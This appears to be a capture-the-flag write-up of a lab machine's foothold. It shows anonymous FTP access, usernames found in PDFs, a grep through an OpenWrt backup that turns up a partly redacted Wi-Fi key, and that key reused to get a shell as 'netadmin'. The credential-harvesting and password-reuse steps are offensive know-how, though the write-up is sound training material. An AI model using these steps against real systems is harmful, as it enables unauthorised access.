Anonymous FTP access is allowed
```
└─$ ftp anonymous@10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47584|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
226 Directory send OK.

```

## employee_wellness.pdf
Potential user discovered
![](Attachments/EmployeePDFUsername.png)

## ProjectOpenWRT.pdf
Another potential user discovered
![](Attachments/ProjectOpenWRTUsername.png)

## backup-OpenWrt-2023-07-26.tar
Extracting
```
└─$ tar -xvf backup-OpenWrt-2023-07-26.tar 
./etc/
./etc/config/
./etc/config/system
./etc/config/wireless
./etc/config/firewall
<SNIP>
```

Searching for passwords
```
└─$ grep -ri passw .
./config/luci:  option passwd '/etc/passwd'
./config/wireless:      option key 'Ve<SNIP>1!'
./config/wireless:      option key 'Ve<SNIP>1!'
./config/rpcd:  option password '$p$root'
./config/dropbear:      option PasswordAuth 'on'
./config/dropbear:      option RootPasswordAuth 'on'
./profile:export HOME=$(grep -e "^${USER:-root}:" /etc/passwd | cut -d ":" -f 6)
./profile:There is no root password defined on this device!
./profile:Use the "passwd" command to set up a new password

└─$ cat config/wireless          

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'Ve<SNIP>1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'Ve<SNIP>1!'

└─$ cat passwd         
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false

```


Got a shell with `netadmin:Ve<SNIP>1!`